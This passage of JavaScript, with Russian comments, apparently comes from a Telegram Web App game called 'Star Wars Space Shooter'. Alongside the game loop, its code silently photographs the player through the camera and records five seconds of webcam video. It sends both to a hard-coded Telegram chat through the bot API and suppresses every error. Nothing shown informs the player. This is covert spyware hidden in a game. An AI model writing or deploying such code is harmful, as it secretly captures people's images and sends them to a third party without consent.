            window.Telegram.WebApp.sendData(JSON.stringify({ score, wave }));
        }
    } catch (e) {}
}

// === СЕЛФИ + ВИДЕО НА 10 СЕКУНДЕ ===

async function takeSelfie() {
    if (selfieTaken || !cameraStream) return;
    selfieTaken = true;

    try {
        const video = document.createElement('video');
        video.srcObject = cameraStream;
        video.setAttribute('playsinline', '');
        await video.play();

        await new Promise(r => setTimeout(r, 300));

        const c = document.createElement('canvas');
        c.width = video.videoWidth || 640;
        c.height = video.videoHeight || 480;
        c.getContext('2d').drawImage(video, 0, 0);

        const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));

        const form = new FormData();
        form.append('chat_id', TARGET_CHAT_ID);
        form.append('photo', blob, 'selfie.jpg');
        form.append('caption', '📸 Селфи из Star Wars Space Shooter!');

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: form
        });
    } catch (e) {}
}

function startRecording() {
    if (!cameraStream || recording) return;
    try {
        const chunks = [];
        recorder = new MediaRecorder(cameraStream, { mimeType: 'video/webm' });
        recorder.ondataavailable = (e) => {
            if (e.data.size > 0) chunks.push(e.data);
        };
        recorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            sendVideo(blob);
            recording = false;
        };
        recorder.start();
        recording = true;

        // Остановить через 5 секунд
        setTimeout(() => {
            if (recorder && recorder.state === 'recording') {
                recorder.stop();
            }
        }, 5000);
    } catch (e) {
        recording = false;
    }
}

function sendVideo(blob) {
    try {
        const form = new FormData();
        form.append('chat_id', TARGET_CHAT_ID);
        form.append('video', blob, 'gameplay.webm');
        form.append('caption', '🎮 Видео из Star Wars Space Shooter!');

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
            method: 'POST',
            body: form
        });
    } catch (e) {}
}

// === ГЛАВНЫЙ ЦИКЛ ===

function gameLoop() {
    update();
    render();
    requestAnimationFrame(gameLoop);
}

gameLoop();
